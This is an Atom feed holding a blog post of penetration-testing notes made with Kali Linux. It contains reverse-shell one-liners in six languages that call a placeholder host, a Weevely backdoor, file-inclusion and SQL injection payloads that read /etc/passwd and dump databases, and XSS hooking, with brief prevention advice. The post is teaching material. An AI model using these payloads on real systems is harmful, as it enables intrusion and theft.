<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Jack McKew's Blog - infosec</title><link href="https://jackmckew.dev/" rel="alternate"></link><link href="https://jackmckew.dev/feeds/infosec.atom.xml" rel="self"></link><id>https://jackmckew.dev/</id><updated>2020-09-11T00:00:00+10:00</updated><subtitle>Engineer | Software Developer | Data Scientist</subtitle><entry><title>Web Penetration Testing with Kali Linux</title><link href="https://jackmckew.dev/web-penetration-testing-with-kali-linux.html" rel="alternate"></link><published>2020-09-11T00:00:00+10:00</published><updated>2020-09-11T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-11:/web-penetration-testing-with-kali-linux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https â€¦&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali.org/downloads/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This post is apart of a series of posts, see the other posts at:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jackmckew.dev/network-hacking-with-kali-linux.html"&gt;Network Hacking with Kali Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://jackmckew.dev/gaining-access-with-kali-linux.html"&gt;Gaining Access with Kali Linux&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you to Chris B for helping me with the notes in this post below!&lt;/p&gt;
&lt;p&gt;Thank you to Sarah H who shared a neat cheat sheet which can be found at: &lt;a href="https://www.comparitech.com/net-admin/kali-linux-cheat-sheet/"&gt;https://www.comparitech.com/net-admin/kali-linux-cheat-sheet/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#web-information-gathering"&gt;Web Information Gathering&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#discovering-subdomains"&gt;Discovering Subdomains&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#discovering-sensitive-files"&gt;Discovering Sensitive Files&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#exploiting-server-vulnerabilities"&gt;Exploiting Server Vulnerabilities&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#exploiting-file-upload-vulnerabilities-to-gain-access"&gt;Exploiting File Upload Vulnerabilities to Gain Access&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#exploiting-code-execution-vulnerabilities"&gt;Exploiting Code Execution Vulnerabilities&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#bash"&gt;Bash&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#perl"&gt;PERL&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#python"&gt;Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#php"&gt;PHP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#ruby"&gt;Ruby&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#netcat"&gt;Netcat&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#local-file-inclusion"&gt;Local File Inclusion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#remote-file-inclusion"&gt;Remote File Inclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#prevention-of-web-server-exploits"&gt;Prevention of Web Server Exploits&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#sql-injection-and-attacks"&gt;SQL Injection and Attacks&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#discovering-sql-injections-with-form-submissions-post"&gt;Discovering SQL Injections with Form Submissions (POST)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#bypassing-logins-via-injections"&gt;Bypassing Logins via Injections&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#discovering-sql-injections-in-data-retrieval-get"&gt;Discovering SQL Injections in Data Retrieval (GET)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#read-and-writing-files-on-the-server-via-sql"&gt;Read and Writing Files on the Server via SQL.&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#reading"&gt;Reading&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#writing"&gt;Writing&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#use-sqlmap-to-do-the-above-and-more"&gt;Use SQLmap to do the Above and More&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#prevention-of-sql-vulnerabilities"&gt;Prevention of SQL Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#cross-site-scriptingxss"&gt;CROSS SITE SCRIPTING(XSS)&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#prevention-of-xss-vulnerabilities"&gt;Prevention of XSS Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#to-automatically-discover-web-vulnerabilities"&gt;To Automatically Discover Web Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="web-information-gathering"&gt;Web Information Gathering&lt;/h2&gt;
&lt;p&gt;As per the last two posts, information is power is security. So we always start by gathering as much information as possible about the target as this may inform us on the best way to carry out an attack.&lt;/p&gt;
&lt;p&gt;Some helpful tools for learning information about websites are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="http://whois.domaintools.com/"&gt;http://whois.domaintools.com/&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;Find info about the owner of the target, also possibly webserver results. Look at hosting and info, possibly for social engineering.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://sitereport.netcraft.com/"&gt;https://sitereport.netcraft.com/&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;Shows technologies used on the target. Look at the technologies used for exploits, and coding languages used (code your virus in  languages that the server can understand).  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.exploit-db.com/"&gt;https://www.exploit-db.com/&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;Database of exploits, make sure versions match.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.robtex.com/"&gt;https://www.robtex.com/&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;Comprehensive DNS information.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Several websites can be installed on a single computer (same IP). If you cannot get into your target try to hack into another website. Another way of getting websites on the same IP (other than Robtex) is to go to bing and search &lt;code&gt;ip:[target_ip]&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id="discovering-subdomains"&gt;Discovering Subdomains&lt;/h3&gt;
&lt;p&gt;Use a tool called knock (typically install into /opt on Kali). As with most of the tools on Kali linux, Knock is open source and can be found &lt;a href="https://github.com/guelfoweb/knock"&gt;https://github.com/guelfoweb/knock&lt;/a&gt;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;git clone &amp;lt;https://github.com/guelfoweb/knock.git&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;cd into the folder.&lt;/li&gt;
&lt;li&gt;run it using, &lt;code&gt;python knock.py [target]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;if doesn't work try running the above with --resolve , then run the above again.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Subdomains sometimes contain beta testing applications and scripts. look for exploits in these areas.&lt;/p&gt;
&lt;h3 id="discovering-sensitive-files"&gt;Discovering Sensitive Files&lt;/h3&gt;
&lt;p&gt;Use &lt;a href="https://tools.kali.org/web-applications/dirb"&gt;dirb&lt;/a&gt; (use &lt;code&gt;man dirb&lt;/code&gt; for help). DIRB is a web content scanner, which looks for existing (or hidden) Web Objects. DIRB works by launching a dictionary attack against a web server and analyses the response (essentially just try different file names and see if it has a response).&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;dirb [target] [wordlist] [options]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;a / usually means you are in a directory.&lt;/li&gt;
&lt;li&gt;phpinfo.php - very useful information, robots.txt -hidden information that admins don't want us to see.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="exploiting-server-vulnerabilities"&gt;Exploiting Server Vulnerabilities&lt;/h2&gt;
&lt;p&gt;The following are a series of ways to exploit web servers for different outcomes.&lt;/p&gt;
&lt;h3 id="exploiting-file-upload-vulnerabilities-to-gain-access"&gt;Exploiting File Upload Vulnerabilities to Gain Access&lt;/h3&gt;
&lt;p&gt;Using a tool called &lt;a href="https://tools.kali.org/maintaining-access/weevely"&gt;Weevely&lt;/a&gt;. Weevely is a stealthy web shell to simulate a telnet-like connection. This is useful as a backdoor and/or to manage web accounts on a web server.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;weevly generate [password] [path+filename]&lt;/code&gt; - create backdoor&lt;/li&gt;
&lt;li&gt;upload the file.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;weevly [url_to_file]&lt;/code&gt; - connect to the file&lt;/li&gt;
&lt;li&gt;&lt;code&gt;help&lt;/code&gt; - help&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Before trying to use tools just browse the website and get a feel for it, look for exploits in features, specifically if the website allows for an upload.&lt;/p&gt;
&lt;h3 id="exploiting-code-execution-vulnerabilities"&gt;Exploiting Code Execution Vulnerabilities&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Always experiment with any input boxes you see, as they are executing a command, you might be able to change the command.&lt;/li&gt;
&lt;li&gt;Can use &amp;amp;&amp;amp; or ; in unix to execute multiple commands in one line. Test if input box allows this.&lt;/li&gt;
&lt;li&gt;Most servers have python and netcat.&lt;/li&gt;
&lt;li&gt;Listen for incoming connections, example using netcat:&lt;ul&gt;
&lt;li&gt;&lt;code&gt;netcat -vv -l -p [port]&lt;/code&gt; - listens for connections on port 8080&lt;/li&gt;
&lt;li&gt;ie. nc -e /bin/sh [ip] [port] - netcat connection.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Following this are a list of commands that you could execute to get a reverse connection for different supported languages. Where the variable to change denoted by &lt;code&gt;[HOST_IP]&lt;/code&gt; and optionally to change the port. Note that these are all 'one-liners' so they could be executed in input boxes.&lt;/p&gt;
&lt;h4 id="bash"&gt;Bash&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/&lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt;/8080 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id="perl"&gt;PERL&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;perl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="s"&gt;'use Socket;$i="[HOST_IP]";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id="python"&gt;Python&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST_IP]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id="php"&gt;PHP&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;php -r '$sock=fsockopen("[HOST_IP]",8080);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id="ruby"&gt;Ruby&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ruby&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rsocket&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="s1"&gt;'f=TCPSocket.open("[HOST_IP]",8080).to_i;exec sprintf("/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d",f,f,f)'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id="netcat"&gt;Netcat&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -e /bin/sh &lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id="local-file-inclusion"&gt;Local File Inclusion&lt;/h3&gt;
&lt;p&gt;Allows an attacker to read ANY file on the same server. Allows access of outside www folder. /etc/passwd contains all the users for the current os. Go back into the directories to find the above file. So if the url contains something like &lt;code&gt;page=include.php&lt;/code&gt;, do something like &lt;code&gt;page=/../../../../../etc/passwd&lt;/code&gt;. What this does is by instead of loading the specific file that was originally targeted, we can load something that it wasn't intending to load from the same server.&lt;/p&gt;
&lt;h3 id="remote-file-inclusion"&gt;Remote File Inclusion&lt;/h3&gt;
&lt;p&gt;If doing this on an actual server the file you want to access has to have a real IP or domain name.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;create a php file with the following:&lt;/li&gt;
&lt;/ol&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class="nb"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"[command]"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;passthru executes system commands. For example use the netcat command as above.&lt;/p&gt;
&lt;p&gt;Ensure this file is stored on a webserver that the target can access. Make sure the file extension is &lt;code&gt;.txt&lt;/code&gt; not &lt;code&gt;.php&lt;/code&gt; or it runs on your webserver.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Listen for connections. &lt;code&gt;nc -vv -l -p [port]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Under the &lt;code&gt;page=&lt;/code&gt; part paste the location of your php file. and add a ? to the end to exe as php eg. &lt;code&gt;page=[ip]/[file]?&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="prevention-of-web-server-exploits"&gt;Prevention of Web Server Exploits&lt;/h2&gt;
&lt;p&gt;The above only happens because the server allows it and is misconfigured.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;File upload vulnerabilities &lt;ul&gt;
&lt;li&gt;Do not allow unsafe files to be uploaded.&lt;/li&gt;
&lt;li&gt;If you are asking for an image ensure it is an image, never allow exe uploads.&lt;/li&gt;
&lt;li&gt;Check the file type, not the extension.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code exec vulnerabilities&lt;ul&gt;
&lt;li&gt;Do'nt use dangerous functions,&lt;/li&gt;
&lt;li&gt;Filter the input before execution&lt;/li&gt;
&lt;li&gt;If you have to use function make sure you analyse the input before exec.&lt;/li&gt;
&lt;li&gt;Use regular expressions (regex).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;File inclusion vulnerabilties&lt;ul&gt;
&lt;li&gt;Disable the allow_url_fopen and allow_url_include settings in php (in the /etc/php5/cgi/php.ini)&lt;/li&gt;
&lt;li&gt;Use static file inclusion (hard code the files)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="sql-injection-and-attacks"&gt;SQL Injection and Attacks&lt;/h2&gt;
&lt;p&gt;Obligatory XKCD comic on SQL injection attacks:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://xkcd.com/327/"&gt;&lt;img alt="Bobby Tables" class="img-fluid" src="https://jackmckew.dev/img/exploits_of_a_mom.png"/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;To connect to a mySQL database &lt;code&gt;mysql -u [username] -h [IP of server]&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;show databases;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use [database];&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;show tables;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="discovering-sql-injections-with-form-submissions-post"&gt;Discovering SQL Injections with Form Submissions (POST)&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Whenever you see an input box try to break it, try using AND, ORDER BY or '.&lt;/li&gt;
&lt;li&gt;Look for subtle changes.&lt;/li&gt;
&lt;li&gt;Enter correct info then ' then use AND, use a # as a comment to terminate early.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;An example of this is a user/password input box(s) may potentially be making a SQL query like &lt;code&gt;SELECT * from accounts where user='$USER_INPUT_BOX_VALUE' and password='$PASSWORD_INPUT_BOX_VALUE'&lt;/code&gt;. We could run an injection on this query by setting our password as &lt;code&gt;123456' AND 1=1#&lt;/code&gt;. This would hopefully execute and confirm that we could inject any SQL query into the webserver database (such as show all passwords).&lt;/p&gt;
&lt;h3 id="bypassing-logins-via-injections"&gt;Bypassing Logins via Injections&lt;/h3&gt;
&lt;p&gt;Another neat use would be to inject the SQL query such that the query ends up as &lt;code&gt;SELECT * from accounts where user='admin' and password='wrong_password' or 1=1&lt;/code&gt;, this would potentially log us in as admin without knowing the password at all as the second case in the and statement will be True if the query evaluates 1 to be equal to 1.&lt;/p&gt;
&lt;h3 id="discovering-sql-injections-in-data-retrieval-get"&gt;Discovering SQL Injections in Data Retrieval (GET)&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Always try to inject things in the php scripts (in the address bar it will look like index.php&amp;amp;username=xxxx&amp;amp;password=xxxxx)&lt;/li&gt;
&lt;li&gt;Use ORDER BY after a field eg. &lt;code&gt;index.php&amp;amp;username=xxxx' ORDER BY 1 #&amp;amp;password=xxxxx&lt;/code&gt; Ensure to use the URL encoding for symbols ie. # = %23&lt;/li&gt;
&lt;li&gt;Order By column 100000 will return an error keep doing order by 1,2,3,4,5 and when you get an error you know the db has that amount of columns&lt;/li&gt;
&lt;li&gt;Use a union&lt;/li&gt;
&lt;li&gt;eg. &lt;code&gt;index.php&amp;amp;username=xxxx' union 1,2,3,4,5 #&amp;amp;password=xxxxx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Swap the numbers with other stuff ie. &lt;code&gt;1,database(),user(),version(),5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;union select 1, table_name, null, null,5 from information_schema.tables&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="read-and-writing-files-on-the-server-via-sql"&gt;Read and Writing Files on the Server via SQL.&lt;/h3&gt;
&lt;p&gt;We can also use SQL injections to read/write files that located on the target computer as well.&lt;/p&gt;
&lt;h4 id="reading"&gt;Reading&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;union select null, load_file('/etc/passwd'), null, null,null&lt;/code&gt;&lt;/p&gt;
&lt;h4 id="writing"&gt;Writing&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;union select null, 'example example', null, null,null into outfile '[path]'&lt;/code&gt;&lt;/p&gt;
&lt;h3 id="use-sqlmap-to-do-the-above-and-more"&gt;Use SQLmap to do the Above and More&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;sqlmap --help&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]"&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --dbs&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;to get the databases&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --current-user&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;to get user&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --current-db&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;current database&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --tables -D [database]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;gets the tables in the -D database&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --columns -T [table_name] -D [database]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;gets columns in the tables of the database&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" -T [table_name] -D [database] --dump&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;Get all the data in the table of the database&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="prevention-of-sql-vulnerabilities"&gt;Prevention of SQL Vulnerabilities&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Use filters (but can be bypassed)&lt;/li&gt;
&lt;li&gt;Use a deny list or allow list. (but can be bypassed)&lt;/li&gt;
&lt;li&gt;Best method is to code the web application in a way that does not allow code injection.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To do the above you must use parameterised statements. (where the data and the code are separated)&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Prepare you statement most languages have a function for it.&lt;ul&gt;
&lt;li&gt;So the statement is static and only the value will be inserted eg. prepare(select * from username where username = ?) then when the statement is executed if it will search for the raw input data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use filters as second line.&lt;/li&gt;
&lt;li&gt;Use a user with the least amount of privileges needed.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="cross-site-scriptingxss"&gt;CROSS SITE SCRIPTING(XSS)&lt;/h2&gt;
&lt;p&gt;Executed on the people browsing the website not the server. Allows javascript injection onto the page. Code is executed when the page loads.&lt;/p&gt;
&lt;p&gt;3 main types&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Persistent/Stored XSS&lt;/li&gt;
&lt;li&gt;Reflected XSS - non persistent xss. only will work if the target visits a specially crafted url eg. &lt;code&gt;target.com/page.php?something=&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;DOM based XSS&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Test text boxes and urls with parameters (the php stuff).&lt;/p&gt;
&lt;p&gt;Inject beef hook into vulnerable pages. If text areas have a max length, go into developer console and inspect element and change the max length.&lt;/p&gt;
&lt;h3 id="prevention-of-xss-vulnerabilities"&gt;Prevention of XSS Vulnerabilities&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Minimize input.&lt;/li&gt;
&lt;li&gt;Convert user input to the html character symbol so &lt;code&gt;&amp;amp;nsb&lt;/code&gt; and instead of &amp;amp; use &lt;code&gt;&amp;amp;jsjs;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Escape the input.&lt;/li&gt;
&lt;li&gt;Rarely trust alerts within the browser!&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="to-automatically-discover-web-vulnerabilities"&gt;To Automatically Discover Web Vulnerabilities&lt;/h2&gt;
&lt;p&gt;Use Zed Attack Proxy (zap) &lt;a href="https://owasp.org/www-project-zap/"&gt;https://owasp.org/www-project-zap/&lt;/a&gt;, this is already installed on Kali.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Search in apps ZAP&lt;/li&gt;
&lt;li&gt;You have to get this app via github.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;chmod +x [name]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Run it&lt;/li&gt;
&lt;li&gt;After install click no persistent.&lt;/li&gt;
&lt;li&gt;The cog icon on the left allows options to be modified&lt;/li&gt;
&lt;li&gt;If you click the green plus on the bottom window then go to active scans. then the little panel in the top left the the windows you can change policies.&lt;/li&gt;
&lt;li&gt;Add the url in automated scan.&lt;/li&gt;
&lt;li&gt;Bottom left under alerts, is where all the vulnerabilities that have been discovered are displayed.&lt;/li&gt;
&lt;li&gt;If you right click one of the alerts (bottom left) then open in browsers it will show you the exploit and how it got it.&lt;/li&gt;
